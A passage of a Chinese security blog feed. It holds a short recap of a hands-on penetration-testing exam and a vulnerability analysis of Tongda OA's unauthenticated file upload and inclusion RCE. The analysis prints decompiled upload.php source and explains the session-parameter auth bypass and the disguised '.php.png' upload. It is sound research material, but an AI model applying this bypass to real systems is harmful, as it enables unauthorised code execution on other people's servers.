      <url>/2020/04/06/%E8%AE%B0%E4%B8%80%E6%AC%A1360%E4%BC%97%E6%B5%8B%E4%BB%BF%E7%9C%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E8%80%83%E6%A0%B8WP/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x00-考核主要分为两部分"><a href="#0x00-考核主要分为两部分" class="headerlink" title="0x00 考核主要分为两部分"></a>0x00 考核主要分为两部分</h1><ul><li><p>第一部分为客观题：分为单选题，多选题，和判断题。</p><p>我记录了一道有趣的题，也是不清楚正确答案的群</p></li><li><p>第二部分为操作题：</p></li></ul><h1 id="0x01客观题"><a href="#0x01客观题" class="headerlink" title="0x01客观题"></a>0x01客观题</h1><p>我记录了一道有趣的题，也是不清楚正确答案，有大佬知道吗</p><p><img src="https://img-blog.csdnimg.cn/2020040611053972.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h1 id="0x02-操作题"><a href="#0x02-操作题" class="headerlink" title="0x02:操作题"></a>0x02:操作题</h1><ul><li>源码分析题，给你源码提及一个数据</li></ul><p><img src="https://img-blog.csdnimg.cn/20200406110455129.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="&lt;img src=&quot;/Users/zy/Library/Application Support/typora-user-images/image-20200406104825988.png&quot; alt=&quot;image-20200406104825988&quot; style=&quot;zoom:50%;&quot; /&gt;"></p><p>PHP == 弱语言绕过 ，因为没弄过CTF也是印象比较深刻</p><ul><li>网站被黑，可以下载整站，找后门</li></ul><p>下载源码，找见后门webshell，看一眼，变形的一句话，连上</p><ul><li>一个加密的一句话木马</li></ul><p>就普通一句话各种decode</p><ul><li>IP伪造登陆 X-FORWORD</li></ul><p>只能客户端登陆</p><ul><li>一个弹幕网站 </li></ul><p>进去发现是Struts2的，有工具一把梭</p><ul><li>xxx系统的数据库系统。postgresql</li></ul><p>识别出来是postgresql，但是连上了啥也没找到，没做出来。。。</p><ul><li>一个登录框</li></ul><p>点点发现有注入，sqlmap直接跑了</p><ul><li>wireshark分析数据包的</li></ul><p>有人改了数据库密码  找到修改的 数据库密码</p><ul><li>wireshark分析数据包的</li></ul><p>删除数据库记录的ip</p><ul><li>wireshark分析数据包的</li></ul><p>找上传者的ip</p><p>0x03 总结：</p><p>1、感觉是给我分的题不是很难，所以还行感觉</p><p>2、wireshark稍微看一下，其实有技巧，搜索关键字就行</p><p>3、主要是题型的分辩，知道考啥就好说，常见的CVE多复现，多练练就好了</p><p><img src="https://img-blog.csdnimg.cn/20200406110415461.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>通达OA任意文件上传/文件包含RCE漏洞分析</title>
      <link href="/2020/03/30/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0!%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABRCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2020/03/30/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0!%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABRCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>@<a href="通达OA任意文件上传/文件包含RCE漏洞分析">TOC</a></p><h1 id="0x01-前提"><a href="#0x01-前提" class="headerlink" title="0x01 前提"></a>0x01 前提</h1><p>关于这个漏洞的利用方式：</p><p>​    </p><p>利用方式大致有两种：</p><ol><li>包含日志文件。</li><li>绕过身份验证文件上传然后在文件包含。</li></ol><p>下面主要分析第二种</p><h1 id="0x01-漏洞介绍"><a href="#0x01-漏洞介绍" class="headerlink" title="0x01 漏洞介绍"></a>0x01 漏洞介绍</h1><p><em>通达OA</em>系统代表了协同OA的先进理念,16年研发铸就成熟OA产品,协同OA软件行业唯一央企团队研发,多次摘取国内OA软件金奖,拥有2万多家正式用户,8万多家免费版用户,超过…</p><p>主要危害：</p><p>攻击者可以在为登陆或者说，无任何条件触发漏洞，上传图片木马文件，请求进行文件包含最终可达成远程命令执行</p><p>影响版本：</p><ul><li>V11版</li><li>2017版</li><li>2016版</li><li>2015版</li><li>2013版</li><li>2013增强版</li></ul><h1 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h1><p>我用的官网下载的V11.3</p><p>利用方式大致有两种：</p><ol><li>包含日志文件。</li><li>绕过身份验证文件上传然后在文件包含。</li></ol><p>下面我主要分析饶过权限上传，然后文件包含的方式：</p><h2 id="首先下载安装"><a href="#首先下载安装" class="headerlink" title="首先下载安装"></a>首先下载安装</h2><p>打开源码一看，都加密了，使用zend进行了加密。</p><p>所以先要进行解密，百度即可。</p><p><img src="https://img-blog.csdnimg.cn/20200330094732543.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="绕过身份验证文件上传部分"><a href="#绕过身份验证文件上传部分" class="headerlink" title="绕过身份验证文件上传部分"></a>绕过身份验证文件上传部分</h2><p>存在漏洞的上传功能文件为 webroot\ispirit\im\upload.php</p><p>解密后的源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line">$P = $_POST[<span class="string">'P'</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($P) || $P != <span class="string">''</span>) &#123;</span><br><span class="line">    ob_start();</span><br><span class="line">    <span class="keyword">include_once</span> <span class="string">'inc/session.php'</span>;</span><br><span class="line">    session_id($P);</span><br><span class="line">    session_start();</span><br><span class="line">    session_write_close();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">include_once</span> <span class="string">'./auth.php'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">'inc/utility_file.php'</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">'inc/utility_msg.php'</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">'mobile/inc/funcs.php'</span>;</span><br><span class="line">ob_end_clean();</span><br><span class="line">$TYPE = $_POST[<span class="string">'TYPE'</span>];</span><br><span class="line">$DEST_UID = $_POST[<span class="string">'DEST_UID'</span>];</span><br><span class="line">$dataBack = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">if</span> ($DEST_UID != <span class="string">''</span> &amp;&amp; !td_verify_ids($ids)) &#123;</span><br><span class="line">    $dataBack = <span class="keyword">array</span>(<span class="string">'status'</span> =&gt; <span class="number">0</span>, <span class="string">'content'</span> =&gt; <span class="string">'-ERR '</span> . _(<span class="string">'½ÓÊÕ·½IDÎÞÐ§'</span>));</span><br><span class="line">    <span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (strpos($DEST_UID, <span class="string">','</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $DEST_UID = intval($DEST_UID);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($DEST_UID == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($UPLOAD_MODE != <span class="number">2</span>) &#123;</span><br><span class="line">        $dataBack = <span class="keyword">array</span>(<span class="string">'status'</span> =&gt; <span class="number">0</span>, <span class="string">'content'</span> =&gt; <span class="string">'-ERR '</span> . _(<span class="string">'½ÓÊÕ·½IDÎÞÐ§'</span>));</span><br><span class="line">        <span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$MODULE = <span class="string">'im'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">1</span> &lt;= count($_FILES)) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($UPLOAD_MODE == <span class="string">'1'</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (strlen(urldecode($_FILES[<span class="string">'ATTACHMENT'</span>][<span class="string">'name'</span>])) != strlen($_FILES[<span class="string">'ATTACHMENT'</span>][<span class="string">'name'</span>])) &#123;</span><br><span class="line">            $_FILES[<span class="string">'ATTACHMENT'</span>][<span class="string">'name'</span>] = urldecode($_FILES[<span class="string">'ATTACHMENT'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $ATTACHMENTS = upload(<span class="string">'ATTACHMENT'</span>, $MODULE, <span class="keyword">false</span>);</span><br><span class="line">    <span class="keyword">if</span> (!is_array($ATTACHMENTS)) &#123;</span><br><span class="line">        $dataBack = <span class="keyword">array</span>(<span class="string">'status'</span> =&gt; <span class="number">0</span>, <span class="string">'content'</span> =&gt; <span class="string">'-ERR '</span> . $ATTACHMENTS);</span><br><span class="line">        <span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ob_end_clean();</span><br><span class="line">    $ATTACHMENT_ID = substr($ATTACHMENTS[<span class="string">'ID'</span>], <span class="number">0</span>, <span class="number">-1</span>);</span><br><span class="line">    $ATTACHMENT_NAME = substr($ATTACHMENTS[<span class="string">'NAME'</span>], <span class="number">0</span>, <span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> ($TYPE == <span class="string">'mobile'</span>) &#123;</span><br><span class="line">        $ATTACHMENT_NAME = td_iconv(urldecode($ATTACHMENT_NAME), <span class="string">'utf-8'</span>, MYOA_CHARSET);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $dataBack = <span class="keyword">array</span>(<span class="string">'status'</span> =&gt; <span class="number">0</span>, <span class="string">'content'</span> =&gt; <span class="string">'-ERR '</span> . _(<span class="string">'ÎÞÎÄ¼þÉÏ´«'</span>));</span><br><span class="line">    <span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">$FILE_SIZE = attach_size($ATTACHMENT_ID, $ATTACHMENT_NAME, $MODULE);</span><br><span class="line"><span class="keyword">if</span> (!$FILE_SIZE) &#123;</span><br><span class="line">    $dataBack = <span class="keyword">array</span>(<span class="string">'status'</span> =&gt; <span class="number">0</span>, <span class="string">'content'</span> =&gt; <span class="string">'-ERR '</span> . _(<span class="string">'ÎÄ¼þÉÏ´«Ê§°Ü'</span>));</span><br><span class="line">    <span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($UPLOAD_MODE == <span class="string">'1'</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (is_thumbable($ATTACHMENT_NAME)) &#123;</span><br><span class="line">        $FILE_PATH = attach_real_path($ATTACHMENT_ID, $ATTACHMENT_NAME, $MODULE);</span><br><span class="line">        $THUMB_FILE_PATH = substr($FILE_PATH, <span class="number">0</span>, strlen($FILE_PATH) - strlen($ATTACHMENT_NAME)) . <span class="string">'thumb_'</span> . $ATTACHMENT_NAME;</span><br><span class="line">        CreateThumb($FILE_PATH, <span class="number">320</span>, <span class="number">240</span>, $THUMB_FILE_PATH);</span><br><span class="line">    &#125;</span><br><span class="line">    $P_VER = is_numeric($P_VER) ? intval($P_VER) : <span class="number">0</span>;</span><br><span class="line">    $MSG_CATE = $_POST[<span class="string">'MSG_CATE'</span>];</span><br><span class="line">    <span class="keyword">if</span> ($MSG_CATE == <span class="string">'file'</span>) &#123;</span><br><span class="line">        $CONTENT = <span class="string">'[fm]'</span> . $ATTACHMENT_ID . <span class="string">'|'</span> . $ATTACHMENT_NAME . <span class="string">'|'</span> . $FILE_SIZE . <span class="string">'[/fm]'</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ($MSG_CATE == <span class="string">'image'</span>) &#123;</span><br><span class="line">            $CONTENT = <span class="string">'[im]'</span> . $ATTACHMENT_ID . <span class="string">'|'</span> . $ATTACHMENT_NAME . <span class="string">'|'</span> . $FILE_SIZE . <span class="string">'[/im]'</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $DURATION = intval($DURATION);</span><br><span class="line">            $CONTENT = <span class="string">'[vm]'</span> . $ATTACHMENT_ID . <span class="string">'|'</span> . $ATTACHMENT_NAME . <span class="string">'|'</span> . $DURATION . <span class="string">'[/vm]'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $AID = <span class="number">0</span>;</span><br><span class="line">    $POS = strpos($ATTACHMENT_ID, <span class="string">'@'</span>);</span><br><span class="line">    <span class="keyword">if</span> ($POS !== <span class="keyword">false</span>) &#123;</span><br><span class="line">        $AID = intval(substr($ATTACHMENT_ID, <span class="number">0</span>, $POS));</span><br><span class="line">    &#125;</span><br><span class="line">    $query = <span class="string">'INSERT INTO im_offline_file (TIME,SRC_UID,DEST_UID,FILE_NAME,FILE_SIZE,FLAG,AID) values (\''</span> . date(<span class="string">'Y-m-d H:i:s'</span>) . <span class="string">'\',\''</span> . $_SESSION[<span class="string">'LOGIN_UID'</span>] . <span class="string">'\',\''</span> . $DEST_UID . <span class="string">'\',\'*'</span> . $ATTACHMENT_ID . <span class="string">'.'</span> . $ATTACHMENT_NAME . <span class="string">'\',\''</span> . $FILE_SIZE . <span class="string">'\',\'0\',\''</span> . $AID . <span class="string">'\')'</span>;</span><br><span class="line">    $cursor = exequery(TD::conn(), $query);</span><br><span class="line">    $FILE_ID = mysql_insert_id();</span><br><span class="line">    <span class="keyword">if</span> ($cursor === <span class="keyword">false</span>) &#123;</span><br><span class="line">        $dataBack = <span class="keyword">array</span>(<span class="string">'status'</span> =&gt; <span class="number">0</span>, <span class="string">'content'</span> =&gt; <span class="string">'-ERR '</span> . _(<span class="string">'Êý¾Ý¿â²Ù×÷Ê§°Ü'</span>));</span><br><span class="line">        <span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $dataBack = <span class="keyword">array</span>(<span class="string">'status'</span> =&gt; <span class="number">1</span>, <span class="string">'content'</span> =&gt; $CONTENT, <span class="string">'file_id'</span> =&gt; $FILE_ID);</span><br><span class="line">    <span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ($UPLOAD_MODE == <span class="string">'2'</span>) &#123;</span><br><span class="line">        $DURATION = intval($_POST[<span class="string">'DURATION'</span>]);</span><br><span class="line">        $CONTENT = <span class="string">'[vm]'</span> . $ATTACHMENT_ID . <span class="string">'|'</span> . $ATTACHMENT_NAME . <span class="string">'|'</span> . $DURATION . <span class="string">'[/vm]'</span>;</span><br><span class="line">        $query = <span class="string">'INSERT INTO WEIXUN_SHARE (UID, CONTENT, ADDTIME) VALUES (\''</span> . $_SESSION[<span class="string">'LOGIN_UID'</span>] . <span class="string">'\', \''</span> . $CONTENT . <span class="string">'\', \''</span> . time() . <span class="string">'\')'</span>;</span><br><span class="line">        $cursor = exequery(TD::conn(), $query);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'+OK '</span> . $CONTENT;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ($UPLOAD_MODE == <span class="string">'3'</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_thumbable($ATTACHMENT_NAME)) &#123;</span><br><span class="line">                $FILE_PATH = attach_real_path($ATTACHMENT_ID, $ATTACHMENT_NAME, $MODULE);</span><br><span class="line">                $THUMB_FILE_PATH = substr($FILE_PATH, <span class="number">0</span>, strlen($FILE_PATH) - strlen($ATTACHMENT_NAME)) . <span class="string">'thumb_'</span> . $ATTACHMENT_NAME;</span><br><span class="line">                CreateThumb($FILE_PATH, <span class="number">320</span>, <span class="number">240</span>, $THUMB_FILE_PATH);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'+OK '</span> . $ATTACHMENT_ID;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $CONTENT = <span class="string">'[fm]'</span> . $ATTACHMENT_ID . <span class="string">'|'</span> . $ATTACHMENT_NAME . <span class="string">'|'</span> . $FILE_SIZE . <span class="string">'[/fm]'</span>;</span><br><span class="line">            $msg_id = send_msg($_SESSION[<span class="string">'LOGIN_UID'</span>], $DEST_UID, <span class="number">1</span>, $CONTENT, <span class="string">''</span>, <span class="number">2</span>);</span><br><span class="line">            $query = <span class="string">'insert into IM_OFFLINE_FILE (TIME,SRC_UID,DEST_UID,FILE_NAME,FILE_SIZE,FLAG) values (\''</span> . date(<span class="string">'Y-m-d H:i:s'</span>) . <span class="string">'\',\''</span> . $_SESSION[<span class="string">'LOGIN_UID'</span>] . <span class="string">'\',\''</span> . $DEST_UID . <span class="string">'\',\'*'</span> . $ATTACHMENT_ID . <span class="string">'.'</span> . $ATTACHMENT_NAME . <span class="string">'\',\''</span> . $FILE_SIZE . <span class="string">'\',\'0\')'</span>;</span><br><span class="line">            $cursor = exequery(TD::conn(), $query);</span><br><span class="line">            $FILE_ID = mysql_insert_id();</span><br><span class="line">            <span class="keyword">if</span> ($cursor === <span class="keyword">false</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'-ERR '</span> . _(<span class="string">'Êý¾Ý¿â²Ù×÷Ê§°Ü'</span>);</span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ($FILE_ID == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'-ERR '</span> . _(<span class="string">'Êý¾Ý¿â²Ù×÷Ê§°Ü2'</span>);</span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'+OK ,'</span> . $FILE_ID . <span class="string">','</span> . $msg_id;</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看下开头这一块，就是绕过的核心部分</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">set_time_limit(0);</span><br><span class="line">$P &#x3D; $_POST[&#39;P&#39;];</span><br><span class="line">if (isset($P) || $P !&#x3D; &#39;&#39;) &#123;</span><br><span class="line">    ob_start();</span><br><span class="line">    include_once &#39;inc&#x2F;session.php&#39;;</span><br><span class="line">    session_id($P);</span><br><span class="line">    session_start();</span><br><span class="line">    session_write_close();</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    include_once &#39;.&#x2F;auth.php&#39;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>这里获取了一个P，如果P存在或者不为空，就要包含上面的auth.php，看名字就知道是一个主要实现身份认证功能，所以通过这里的参数”P”绕过登录认证，就可以去下面的上传了</li><li>在往后就是两个IF条件句，只要进去了都要exit退出，所以要绕过才能进入上传的逻辑里面</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$DEST_UID &#x3D; $_POST[&#39;DEST_UID&#39;];</span><br><span class="line">还好这个参数可控，要求不能为 0 也不能为空就可以了</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200403094623450.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>进入循环后使用PHP的 $_FILES 函数来获取我们上传的文件信息</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_FILES[&#39;ATTACHMENT&#39;][&#39;name&#39;]</span><br></pre></td></tr></table></figure><ul><li>第一个下标必须是我们的input name值，因此我们的POST包的Content-Disposition: form-data; name=”ATTACHMENT”; filename=”xxx.php.png”中的name必须是’ATTACHMENT’。</li><li>也就是有文件上传就会调用upload函数</li><li>后续对获取的文件名处理了一下，对获取的文件名行一次url解码，对比文件名长度是否有变化，如果有变化，则将url解码后的文件名作为最后的文件名</li><li>在45行有upload函数，要跟进看一下干了什么，inc/utility_file.php的1321行</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ATTACHMENTS &#x3D; upload(&#39;ATTACHMENT&#39;, $MODULE, false);</span><br></pre></td></tr></table></figure><p>函数具体代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($PREFIX = <span class="string">'ATTACHMENT'</span>, $MODULE = <span class="string">''</span>, $OUTPUT = true)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (strstr($MODULE, <span class="string">'/'</span>) || strstr($MODULE, <span class="string">'\\'</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!$OUTPUT) &#123;</span><br><span class="line">            <span class="keyword">return</span> _(<span class="string">'参数含有非法字符。'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Message(_(<span class="string">'错误'</span>), _(<span class="string">'参数含有非法字符。'</span>));</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $ATTACHMENTS = <span class="keyword">array</span>(<span class="string">'ID'</span> =&gt; <span class="string">''</span>, <span class="string">'NAME'</span> =&gt; <span class="string">''</span>);</span><br><span class="line">    reset($_FILES);</span><br><span class="line">    <span class="keyword">foreach</span> ($_FILES <span class="keyword">as</span> $KEY =&gt; $ATTACHMENT) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($ATTACHMENT[<span class="string">'error'</span>] == <span class="number">4</span> || $KEY != $PREFIX &amp;&amp; substr($KEY, <span class="number">0</span>, strlen($PREFIX) + <span class="number">1</span>) != $PREFIX . <span class="string">'_'</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $data_charset = <span class="keyword">isset</span>($_GET[<span class="string">'data_charset'</span>]) ? $_GET[<span class="string">'data_charset'</span>] : (<span class="keyword">isset</span>($_POST[<span class="string">'data_charset'</span>]) ? $_POST[<span class="string">'data_charset'</span>] : <span class="string">''</span>);</span><br><span class="line">        $ATTACH_NAME = $data_charset != <span class="string">''</span> ? td_iconv($ATTACHMENT[<span class="string">'name'</span>], $data_charset, MYOA_CHARSET) : $ATTACHMENT[<span class="string">'name'</span>];</span><br><span class="line">        $ATTACH_SIZE = $ATTACHMENT[<span class="string">'size'</span>];</span><br><span class="line">        $ATTACH_ERROR = $ATTACHMENT[<span class="string">'error'</span>];</span><br><span class="line">        $ATTACH_FILE = $ATTACHMENT[<span class="string">'tmp_name'</span>];</span><br><span class="line">        $ERROR_DESC = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">if</span> ($ATTACH_ERROR == UPLOAD_ERR_OK) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!is_uploadable($ATTACH_NAME)) &#123;</span><br><span class="line">                $ERROR_DESC = sprintf(_(<span class="string">'禁止上传后缀名为[%s]的文件'</span>), 